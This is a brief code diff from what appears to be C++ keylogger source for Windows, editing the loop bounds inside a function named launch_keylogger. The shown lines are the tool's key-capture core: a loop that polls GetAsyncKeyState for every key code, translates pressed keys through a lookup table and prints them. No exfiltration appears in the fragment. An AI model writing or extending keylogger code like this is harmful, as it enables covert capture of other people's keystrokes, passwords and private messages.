@@ -62,7 +62,7 @@ void launch_keylogger() {
     int active = 1, key;
 
     while (active) {
-        for (key = 0; key < 255; key++) {
+        for (key = 0x01; key < 0xFF; key++) {
             if (GetAsyncKeyState(key)) {
                 cout << keys.find(key) -> second;
                 Sleep(KEY_INTERVAL);
